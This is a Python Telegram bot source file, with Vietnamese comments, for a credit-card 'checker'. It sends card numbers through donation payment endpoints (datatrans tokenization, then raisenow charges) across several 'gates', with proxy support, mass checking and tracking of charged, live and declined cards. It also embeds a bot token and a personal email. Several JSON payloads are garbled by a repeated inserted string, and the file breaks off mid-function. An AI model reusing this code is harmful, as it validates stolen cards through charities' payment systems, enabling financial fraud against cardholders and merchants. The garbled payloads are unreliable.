# Tên file: bot.py
import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import threading
import random
import psutil
import ssl
import socket
import string
import subprocess
import sys

from datetime import datetime
from pytz import timezone
from urllib.parse import urlparse
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CẤU HÌNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"
# URL cho dịch vụ kiểm tra website nội bộ
SITE_CHECKER_URL = "http://127.0.0.1:5001/check"


# --- TÊN FILE & THƯ MỤC LƯU TRỮ ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Giới hạn cho /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Giới hạn cho /multi
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json" # File lưu ngôn ngữ
LOG_DIR = "check_logs" # Thư mục chính lưu log
BOT_STATUS_FILE = "bot_status.json" # File lưu trạng thái on/off của bot
GATE_FILE = "current_gate.json" # File lưu cổng check hiện tại
GATE_RANGES_FILE = "gate_charge_ranges.json" # File lưu khoảng charge cho các gate
PROXY_FILE = "proxies.json" # File lưu proxy
GATE8_MODE_FILE = "gate8_mode.json" # File lưu chế độ của gate 8
GATE9_MODE_FILE = "gate9_mode.json" # File lưu chế độ của gate 9

# --- GIỚI HẠN MẶC ĐỊNH CHO THÀNH VIÊN ---
DEFAULT_MEMBER_LIMIT = 100 # Cho /mass
MEMBER_THREAD_LIMIT = 3 # Cho /mass
DEFAULT_MULTI_LIMIT = 10 # Cho /multi

# --- CẤU HÌNH MÚI GIỜ ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BIẾN TOÀN CỤC ---
ACTIVE_CHECKS = {} # {user_id: {"full_name": str, "username": str, "start_time": float, "task_type": str}}
CANCELLATION_EVENTS = {} # {user_id: threading.Event}
STATS_FILE_LOCK = threading.Lock() # Lock để tránh xung đột khi nhiều user ghi file stats cùng lúc
BRAND_TO_PAYMENT_METHOD = { # Ánh xạ brand thẻ sang code API
    'VISA': 'VIS',
    'MASTERCARD': 'ECA',
    'AMERICAN EXPRESS': 'AMX',
    'DISCOVER': 'dis',
    'EBS': 'ebs',
    'ELV': 'elv',
    'EPS': 'eps',
    'JCB': 'jcb',
    'MAESTRO': 'mae',
}

# --- TIN NHẮN THÔNG BÁO ---
MESSAGES_VI = {
    "bot_off": "?? **THÔNG BÁO BẢO TRÌ** ??\n\nBot hiện đang tạm thời ngoại tuyến để bảo trì. Các lệnh check sẽ không hoạt động cho đến khi có thông báo mới. Cảm ơn sự kiên nhẫn của bạn!",
    "bot_on": "?? **THÔNG BÁO HOẠT ĐỘNG** ??\n\nBot đã hoạt động trở lại. Cảm ơn bạn đã chờ đợi!",
}
MESSAGES_EN = {
    "bot_off": "?? **MAINTENANCE NOTICE** ??\n\nThe bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!",
    "bot_on": "?? **SERVICE RESUMED NOTICE** ??\n\nThe bot is back online. Thank you for waiting!",
}


# --- CẤU HÌNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KHỞI TẠO ---
# Tạo thư mục log nếu chưa có
os.makedirs(LOG_DIR, exist_ok=True)

# --- QUẢN LÝ USER, DATA & GATE ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE)
    return prefs.get(str(user_id), None)

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE)
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def is_bot_on():
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def get_active_gate():
    gate_data = load_json_file(GATE_FILE, default_data={'gate': '1'})
    return gate_data.get('gate', '1')

def set_active_gate(gate_id):
    save_json_file(GATE_FILE, {'gate': str(gate_id)})

def get_gate8_mode():
    mode_data = load_json_file(GATE8_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate8_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE8_MODE_FILE, {'mode': mode})

def get_gate9_mode():
    mode_data = load_json_file(GATE9_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate9_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE9_MODE_FILE, {'mode': mode})

def _get_charge_value(gate_id, custom_charge_amount=None):
    if custom_charge_amount is not None:
        return custom_charge_amount
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))
    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            return random.randint(int(gate_range['min']), int(gate_range['max']))
        except (ValueError, TypeError):
            logger.warning(f"Lỗi đọc range cho gate {gate_id}, sử dụng mặc định. Range: {gate_range}")
            return 50
    if str(gate_id) == '5':
        return random.randint(50, 200)
    return 50

def get_formatted_gate_name(gate_id):
    if str(gate_id) == '7':
        return "Check Live (Gate 7)"
    if str(gate_id) == '8':
        gate8_mode = get_gate8_mode()
        if gate8_mode == 'live':
            return "Check Live (Gate 8)"
        else:
            default_name = "Charge 0.5$ (Gate 8)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))
            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 8)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 8)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
    if str(gate_id) == '9':
        gate9_mode = get_gate9_mode()
        if gate9_mode == 'live':
            return "Check Live (Gate 9)"
        else:
            default_name = "Charge 0.5$ (Gate 9)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))
            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 9)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 9)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
    default_names = {
        '1': "Charge 0.5$ (Gate 1)", '2': "Charge 0.5$ V2 (Gate 2)",
        '3': "Charge 0.5$ V3 (Gate 3)", '4': "Charge 0.5$ V4 (Gate 4)",
        '5': "Charge 0.5$-2.0$ (Gate 5)", '6': "Charge 0.5$ (Gate 6)",
    }
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))
    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            min_val = int(gate_range['min']) / 100
            max_val = int(gate_range['max']) / 100
            if min_val == max_val:
                return f"Charge {min_val:.2f}$ (Gate {gate_id})"
            else:
                return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate {gate_id})"
        except (ValueError, TypeError):
            return default_names.get(gate_id, f"Unknown Gate {gate_id}")
    else:
        return default_names.get(gate_id, f"Unknown Gate {gate_id}")


def update_user_stats(user_id, user_info, counts):
    with STATS_FILE_LOCK:
        stats = load_json_file(STATS_FILE)
        user_id_str = str(user_id)
        default_user_stat = {
            'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0, 'total_live_success': 0,
            'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
        }
        user_stat_data = stats.get(user_id_str, {})
        if isinstance(user_stat_data, dict):
            default_user_stat.update(user_stat_data)
        stats[user_id_str] = default_user_stat
        stats[user_id_str]['total_charged'] += counts.get('success', 0)
        stats[user_id_str]['total_live_success'] += counts.get('live_success', 0)
        stats[user_id_str]['total_custom'] += counts.get('custom', 0)
        stats[user_id_str]['total_decline'] += counts.get('decline', 0)
        stats[user_id_str]['total_error'] += counts.get('error', 0) + counts.get('gate_dead', 0) + counts.get('gate9_persistent_error', 0)
        stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
        stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
        stats[user_id_str]['username'] = user_info.username
        stats[user_id_str]['full_name'] = user_info.full_name
        save_json_file(STATS_FILE, stats)

# --- CÁC HÀM QUẢN LÝ PROXY ---
def load_proxies():
    return load_json_file(PROXY_FILE, default_data={"enabled": False, "proxies": []})

def save_proxies(data):
    save_json_file(PROXY_FILE, data)

def _format_proxy_for_requests(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(':')
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    else:
        logger.warning(f"Định dạng proxy không hợp lệ: {proxy_str}")
        return None

def _test_proxy(proxy_str: str):
    proxy_dict = _format_proxy_for_requests(proxy_str)
    if not proxy_dict:
        return False, "Định dạng proxy không hợp lệ."
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=7)
        if 200 <= response.status_code < 300:
            return True, f"Thành công (Status: {response.status_code})"
        else:
            return False, f"Thất bại (Status: {response.status_code})"
    except requests.exceptions.ProxyError as e:
        return False, f"Lỗi Proxy: {e}"
    except requests.exceptions.RequestException as e:
        return False, f"Lỗi kết nối: {e}"

# --- CÁC HÀM CỐT LÕI ---

def generate_random_name(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length)).capitalize()

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Lần thử {attempt + 1}/{max_retries} cho {url} thất bại: {e}. Thử lại sau {wait_time}s...")
            time.sleep(wait_time)
    final_error_message = f"Retry: Tất cả {max_retries} lần thử lại cho {url} đều thất bại. Lỗi cuối cùng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "Số thẻ (CC) phải có từ 10-19 chữ số."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Tháng (MM) phải là số từ 1 đến 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Năm (YY) phải có 2 hoặc 4 chữ số."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV phải có 3 hoặc 4 chữ số."
    return True, ""

def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 1"""
    try:
        charge_value = _get_charge_value('1', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": charge_value}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVview=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 1 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 1: {e}", bin_info

def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 2"""
    try:
        charge_value = _get_charge_value('2', custom_charge_amount)
        brand_upper = (bin_info.get('brand') or '').upper()
        payment_method = BRAND_TO_PAYMENT_METHOD.get(brand_upper, 'VIS')
        brand_code = payment_method.lower()
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250801203254539560", "cardNumber": cc, "cvv": cvv, "paymentMethod": payment_method, "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=0cjn3q43b", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "079beaee-ca86-4b8c-9d08-e71b4bd0a40e", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "de", "first_name": "Minh", "last_name": "Nhut", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "street": "Oakridge Farm Lane", "house_number": "2830", "postal_code": "4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": ua}, "solution": {"uuid": "3f9c8a06-2d0b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": brand_code, "cardholder": "Minh Nhut", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "1d7dd23e-7007-4d3b-85b7-00891d2c6df5", "return_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 2 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 2: {e}", bin_info

def _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 3"""
    try:
        charge_value = _get_charge_value('3', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802045852818974", "cardNumber": cc, "cvv": cvv, "paymentMethod": "VIS", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=x0gzkbt03", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "bda022a8-9955-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": charge_value}, "supporter": { "locale": "de", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "embed", "preselected_amount": "2500", "suggested_amounts": "[2500,5000,10000]", "user_agent": ua }, "solution": {"uuid": "9b693323-de98-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "https://donate.raisenow.io/jpctq?analytics.channel=embed&lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "vis", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "b2fbfb20-3195-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVview=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 3 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 3: {e}", bin_info

def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 4"""
    try:
        charge_value = _get_charge_value('4', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802080040638504", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=32stkhqhm", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "0e83cbe3-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVvalue": charge_value}, "supporter": { "locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "street": "Oakridge Farm Lane", "house_number": "2830", "postal_code": "4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV", "preselected_amount": "2500", "suggested_amounts": "[2500,5000,15000]", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }, "solution": {"uuid": "7562d73f-6a18-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.16.0" } }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "56d3c80c-6e0a-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVview=payment_result" }
